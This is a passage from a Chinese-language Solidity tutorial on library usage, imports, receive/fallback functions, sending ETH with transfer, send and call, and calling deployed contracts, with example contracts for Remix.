A）到任何类型（B）。添加完指令后，库<code>A</code>中的函数会自动添加为<code>B</code>类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 利用using for指令</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // 库函数会自动添加为uint256型变量的成员</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. 通过库合约名称调用库函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 直接通过库合约名调用</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们部署合约并输入<code>170</code>测试一下，两种方法均能返回正确的<code>16进制string</code> “0xaa”。证明我们调用库函数成功！</p><h3 id="常用库"><a href="#常用库" class="headerlink" title="常用库"></a>常用库</h3><p>只需要知道什么情况该用什么库合约。常用的有：</p><ol><li>[String]：将<code>uint256</code>转换为<code>String</code></li><li>[Address]：判断某个地址是否为合约地址</li><li>[Create2]：更安全的使用<code>Create2 EVM opcode</code></li><li>[Arrays]：跟数组相关的库函数</li></ol><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p><code>solidity</code>支持利用<code>import</code>关键字导入其他源代码中的合约，让开发更加模块化。</p><ul><li>通过源文件相对位置导入，例子：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件结构</span><br><span class="line">├── Import.sol</span><br><span class="line">└── Yeye.sol</span><br><span class="line"></span><br><span class="line">// 通过文件相对位置import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过源文件网址导入网上的合约，例子：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 通过网址引用</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过<code>npm</code>的目录导入，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>通过<code>全局符号</code>导入特定的合约，例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>引用(<code>import</code>)在代码中的位置为：在声明版本号之后，在其余代码之前。</li></ul><h2 id="接收ETH"><a href="#接收ETH" class="headerlink" title="接收ETH"></a>接收ETH</h2><p>介绍<code>Solidity</code>中的两种特殊函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用，他们主要用于处理接收<code>ETH</code>和代理合约<code>proxy contract</code>。</p><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ol><li>接收ETH</li><li>处理合约中不存在的函数调用（代理合约proxy contract）</li></ol><p>注意：在solidity 0.6.x版本之前，语法上只有 <code>fallback()</code> 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，solidity才将 <code>fallback()</code> 函数拆分成 <code>receive()</code> 和 <code>fallback()</code> 两个函数。</p><h3 id="接收ETH函数-receive"><a href="#接收ETH函数-receive" class="headerlink" title="接收ETH函数 receive"></a>接收ETH函数 receive</h3><p><code>receive()</code>只用于处理接收<code>ETH</code>。一个合约最多有一个<code>receive()</code>函数，声明方式与一般函数不一样，不需要<code>function</code>，声明关键字：<code>receive() external payable &#123; ... &#125;</code>。<code>receive()</code>函数不能有任何的参数，不能返回任何值，必须包含<code>external</code>和<code>payable</code>。</p><p>当合约接收ETH的时候，<code>receive()</code>会被触发。<code>receive()</code>最好不要执行太多的逻辑因为如果别人用<code>send</code>和<code>transfer</code>方法发送<code>ETH</code>的话，<code>gas</code>会限制在<code>2300</code>，<code>receive()</code>太复杂可能会触发<code>Out of Gas</code>报错；如果用<code>call</code>就可以自定义<code>gas</code>执行更复杂的逻辑（这三种发送ETH的方法我们之后会讲到）。</p><p>我们可以在<code>receive()</code>里发送一个<code>event</code>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些恶意合约，会在<code>receive()</code> 函数（老版本的话，就是 <code>fallback()</code> 函数）嵌入恶意消耗<code>gas</code>的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。</p><h3 id="回退函数-fallback"><a href="#回退函数-fallback" class="headerlink" title="回退函数 fallback"></a>回退函数 fallback</h3><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。<code>fallback()</code>声明时不需要<code>function</code>关键字，必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</p><p>我们定义一个<code>fallback()</code>函数，被触发时候会释放<code>fallbackCalled</code>事件，并输出<code>msg.sender</code>，<code>msg.value</code>和<code>msg.data</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="receive和fallback的区别"><a href="#receive和fallback的区别" class="headerlink" title="receive和fallback的区别"></a>receive和fallback的区别</h3><p><code>receive</code>和<code>fallback</code>都能够用于接收<code>ETH</code>，他们触发的规则如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">触发fallback() 还是 receive()?</span><br><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><p>简单来说，合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>。</p><p><code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约发送<code>ETH</code>将会报错。</p><h3 id="本节代码"><a href="#本节代码" class="headerlink" title="本节代码"></a>本节代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    // 定义事件</span><br><span class="line">    event receivedCalled(address Sender, uint Value);</span><br><span class="line">    event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">    // 接收ETH时释放Received事件</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        emit receivedCalled(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // fallback</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Remix 上部署合约 “Fallback.sol”。”VALUE” 栏中填入要发送给合约的金额（单位是 Wei），然后点击 “Transact”。可以看到交易成功，并且触发了 “receivedCalled” 事件。”VALUE” 栏中填入要发送给合约的金额（单位是 Wei），”CALLDATA” 栏中填入随意编写的<code>msg.data</code>，然后点击 “Transact”。可以看到交易成功，并且触发了 “fallbackCalled” 事件。</p><h2 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h2><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>，其中<code>call()</code>是被鼓励的用法。</p><h3 id="接收ETH合约"><a href="#接收ETH合约" class="headerlink" title="接收ETH合约"></a>接收ETH合约</h3><p>我们先部署一个接收<code>ETH</code>合约<code>ReceiveETH</code>。<code>ReceiveETH</code>合约里有一个事件<code>Log</code>，记录收到的<code>ETH</code>数量和<code>gas</code>剩余。还有两个函数，一个是<code>receive()</code>函数，收到<code>ETH</code>被触发，并发送<code>Log</code>事件；另一个是查询合约<code>ETH</code>余额的<code>getBalance()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>ReceiveETH</code>合约后，运行<code>getBalance()</code>函数，可以看到当前合约的<code>ETH</code>余额为<code>0</code>。</p><h3 id="发送ETH合约"><a href="#发送ETH合约" class="headerlink" title="发送ETH合约"></a>发送ETH合约</h3><p>我们将实现三种方法向<code>ReceiveETH</code>合约发送<code>ETH</code>。首先，先在发送ETH合约<code>SendETH</code>中实现<code>payable</code>的<code>构造函数</code>和<code>receive()</code>，让我们能够在部署时和部署后向合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><ul><li>用法是：<code>接收方地址.transfer(发送ETH数额)</code>。</li><li><code>transfer()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</li><li><code>transfer()</code>如果转账失败，会自动<code>revert</code>（回滚交易）。</li></ul><p>代码样例，注意里面的<code>_to</code>填<code>ReceiveETH</code>合约的地址，<code>amount</code>是<code>ETH</code>转账金额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 用transfer()发送ETH</span><br><span class="line">function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    _to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>SendETH</code>合约后，对<code>ReceiveETH</code>合约发送ETH，此时<code>amount</code>为10，<code>value</code>为0，<code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p>此时<code>amount</code>为10，<code>value</code>为10，<code>amount</code>&lt;=<code>value</code>，转账成功。</p><p>在<code>ReceiveETH</code>合约中，运行<code>getBalance()</code>函数，可以看到当前合约的<code>ETH</code>余额为<code>10</code>。</p><h4 id="send"><a href="#send" class="headerlink" title="send"></a>send</h4><ul><li>用法是：<code>接收方地址.send(发送ETH数额)</code>。</li><li><code>send()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</li><li><code>send()</code>如果转账失败，不会<code>revert</code>。</li><li><code>send()</code>的返回值是<code>bool</code>，代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// send()发送ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>ReceiveETH</code>合约发送ETH，此时<code>amount</code>为10，<code>value</code>为0，<code>amount</code>&gt;<code>value</code>，转账失败，因为经过处理，所以发生<code>revert</code>。</p><p>此时<code>amount</code>为10，<code>value</code>为11，<code>amount</code>&lt;=<code>value</code>，转账成功。</p><h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><ul><li>用法是：<code>接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</code>。</li><li><code>call()</code>没有<code>gas</code>限制，可以支持对方合约<code>fallback()</code>或<code>receive()</code>函数实现复杂逻辑。</li><li><code>call()</code>如果转账失败，不会<code>revert</code>。</li><li><code>call()</code>的返回值是<code>(bool, data)</code>，其中<code>bool</code>代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// call()发送ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>ReceiveETH</code>合约发送ETH，此时<code>amount</code>为10，<code>value</code>为0，<code>amount</code>&gt;<code>value</code>，转账失败，因为经过处理，所以发生<code>revert</code>。</p><p>此时<code>amount</code>为10，<code>value</code>为11，<code>amount</code>&lt;=<code>value</code>，转账成功。</p><p>运行三种方法，可以看到，他们都可以成功地向<code>ReceiveETH</code>合约发送<code>ETH</code>。</p><h3 id="本节代码-1"><a href="#本节代码-1" class="headerlink" title="本节代码"></a>本节代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">// 3种方法发送ETH</span><br><span class="line">// transfer: 2300 gas, revert</span><br><span class="line">// send: 2300 gas, return bool</span><br><span class="line">// call: all gas, return (bool, data)</span><br><span class="line"></span><br><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line">error CallFailed(); // 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 用transfer()发送ETH</span><br><span class="line">    function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        _to.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send()发送ETH</span><br><span class="line">    function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">        bool success = _to.send(amount);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert SendFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // call()发送ETH</span><br><span class="line">    function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">        (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert CallFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line"></span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>介绍<code>solidity</code>三种发送<code>ETH</code>的方法：<code>transfer</code>，<code>send</code>和<code>call</code>。</p><ul><li><code>call</code>没有<code>gas</code>限制，最为灵活，是最提倡的方法；</li><li><code>transfer</code>有<code>2300 gas</code>限制，但是发送失败会自动<code>revert</code>交易，是次优选择；</li><li><code>send</code>有<code>2300 gas</code>限制，而且发送失败不会自动<code>revert</code>交易，几乎没有人用它。</li></ul><h2 id="调用已部署合约"><a href="#调用已部署合约" class="headerlink" title="调用已部署合约"></a>调用已部署合约</h2><p>开发者写智能合约来调用其他合约，这让以太坊网络上的程序可以复用，从而建立繁荣的生态。很多<code>web3</code>项目依赖于调用其他合约，比如收益农场（<code>yield farming</code>）。这一讲，我们介绍如何在已知合约代码（或接口）和地址情况下调用目标合约的函数。</p><h3 id="目标合约"><a href="#目标合约" class="headerlink" title="目标合约"></a>目标合约</h3><p>先写一个简单的合约<code>OtherContract</code>来调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract OtherContract &#123;</span><br><span class="line">    uint256 private _x = 0; // 状态变量_x</span><br><span class="line">    // 收到eth的事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)</span><br><span class="line">    function setX(uint256 x) external payable&#123;</span><br><span class="line">        _x = x;</span><br><span class="line">        // 如果转入ETH，则释放Log事件</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            emit Log(msg.value, gasleft());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取_x</span><br><span class="line">    function getX() external view returns(uint x)&#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约包含一个状态变量<code>_x</code>，一个事件<code>Log</code>在收到<code>ETH</code>时触发，三个函数：</p><ul><li><code>getBalance()</code>: 返回合约<code>ETH</code>余额。</li><li><code>setX()</code>: <code>external payable</code>函数，可以设置<code>_x</code>的值，并向合约发送<code>ETH</code>。</li><li><code>getX()</code>: 读取<code>_x</code>的值。</li></ul><h3 id="调用OtherContract合约"><a href="#调用OtherContract合约" class="headerlink" title="调用OtherContract合约"></a>调用<code>OtherContract</code>合约</h3><p>我们可以利用合约的地址和合约代码（或接口）来创建合约的引用：<code>_Name(_Address)</code>，其中<code>_Name</code>是合约名，<code>_Address</code>是合约地址。然后用合约的引用来调用它的函数：<code>_Name(_Address).f()</code>，其中<code>f()</code>是要调用的函数。</p><p>下面我们介绍4个调用合约的例子，在remix中编译合约后，在CONTRACT处分别部署<code>OtherContract</code>和<code>CallContract</code>。</p><h4 id="1-传入合约地址"><a href="#1-传入合约地址" class="headerlink" title="1. 传入合约地址"></a>1. 传入合约地址</h4><p>我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。以调用<code>OtherContract</code>合约的<code>setX</code>函数为例，我们在新合约中写一个<code>callSetX</code>函数，传入已部署好的<code>OtherContract</code>合约地址<code>_Address</code>和<code>setX</code>的参数<code>x</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callSetX(address _Address, uint256 x) external&#123;</span><br><span class="line">    OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制<code>OtherContract</code>合约的地址，填入<code>callSetX</code>函数的参数中，成功调用后，调用<code>OtherContract</code>合约中的<code>getX</code>验证<code>x</code>变为123</p><h4 id="2-传入合约变量"><a href="#2-传入合约变量" class="headerlink" title="2. 传入合约变量"></a>2. 传入合约变量</h4><p>我们可以直接在函数里传入合约的引用，只需要把上面参数的<code>address</code>类型改为目标合约名，比如<code>OtherContract</code>。下面例子实现了调用目标合约的<code>getX()</code>函数。</p><p><strong>注意</strong>该函数参数<code>OtherContract _Address</code>底层类型仍然是<code>address</code>，生成的<code>ABI</code>中、调用<code>callGetX</code>时传入的参数都是<code>address</code>类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">    x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制<code>OtherContract</code>合约的地址，填入<code>callGetX</code>函数的参数中，调用后成功获取<code>x</code>的值</p><h4 id="3-创建合约变量"><a href="#3-创建合约变量" class="headerlink" title="3. 创建合约变量"></a>3. 创建合约变量</h4><p>我们可以创建合约变量，然后通过它来调用目标函数。下面例子，我们给变量<code>oc</code>存储了<code>OtherContract</code>合约的引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callGetX2(address _Address) external view returns(uint x)&#123;</span><br><span class="line">    OtherContract oc = OtherContract(_Address);</span><br><span class="line">    x = oc.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制<code>OtherContract</code>合约的地址，填入<code>callGetX2</code>函数的参数中，调用后成功获取<code>x</code>的值</p><h4 id="4-调用合约并发送ETH"><a href="#4-调用合约并发送ETH" class="headerlink" title="4. 调用合约并发送ETH"></a>4. 调用合约并发送<code>ETH</code></h4><p>如果目标合约的函数是<code>payable</code>的，那么我们可以通过调用它来给合约转账：<code>_Name(_Address).f&#123;value: _Value&#125;()</code>，其中<code>_Name</code>是合约名，<code>_Address</code>是合约地址，<code>f</code>是目标函数名，<code>_Value</code>是要转的<code>ETH</code>数额（以<code>wei</code>为单位）。</p><p><code>OtherContract</code>合约的<code>setX</code>函数是<code>payable</code>的，在下面这个例子中我们通过调用<code>setX</code>来往目标合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function setXTransferETH(address otherContract, uint256 x) payable external&#123;</span><br><span class="line">    OtherContract(otherContract).setX&#123;value: msg.value&#125;(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制<code>OtherContract</code>合约的地址，填入<code>setXTransferETH</code>函数的参数中，并转入10ETH</p><p>转账后，我们可以通过<code>Log</code>事件和<code>getBalance()</code>函数观察目标合约<code>ETH</code>余额的变化。</p><h3 id="本节代码-2"><a href="#本节代码-2" class="headerlink" title="本节代码"></a>本节代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract OtherContract &#123;</span><br><span class="line">    uint256 private _x = 0; // 状态变量x</span><br><span class="line">    // 收到eth事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 